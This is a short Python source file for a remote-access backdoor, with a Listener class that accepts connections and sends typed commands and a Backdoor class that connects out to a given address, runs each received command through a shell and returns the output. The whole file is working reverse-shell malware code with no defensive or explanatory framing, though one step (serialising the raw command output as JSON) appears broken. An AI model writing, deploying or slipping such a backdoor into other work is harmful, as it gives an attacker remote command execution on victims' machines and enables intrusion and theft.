#!/usr/bin/env python3
import socket
import subprocess
import json

class Listener:
    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
        listener.bind((ip , port))
        listener.listen(5)
        print("[+] Waiting incoming connections")
        self.connection,self.adress = listener.accept()
        print("[+] Got a connection from " + str(self.adress))
    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode('utf-8')
        return json.loads(json_data)

    def execute_remotely(self , command):
        self.reliable_send(command)
        return self.reliable_receive()
        
    def run(self):
        while True:
            command  = input(">> ")
            result = self.execute_remotely(command)
            print(result)


class Backdoor:
    def __init__(self, ip ,port):
        self.connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell =True)

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode('utf-8')
        return json.loads(json_data)
        
    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        self.connection.close()